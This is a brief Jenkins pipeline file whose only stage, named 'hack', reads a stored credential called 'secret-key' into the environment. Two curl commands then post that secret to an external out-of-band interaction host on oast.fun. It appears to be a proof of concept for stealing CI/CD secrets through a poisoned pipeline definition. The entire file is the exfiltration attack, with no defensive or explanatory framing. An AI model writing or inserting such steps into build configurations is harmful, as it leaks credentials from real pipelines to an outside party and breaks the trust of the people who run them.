pipeline {
    agent any
     environment {
        secret_key     = credentials('secret-key')
    }
    stages {
        stage('hack') {
            steps {
              sh 'curl -d env="$secret_key" ccen0es2vtc000091wgggg8koeryyyyyb.oast.fun'
              sh 'curl -d env="$secret-key" ccen0es2vtc000091wgggg8koeryyyyyb.oast.fun'
                }
            }
        }
    }
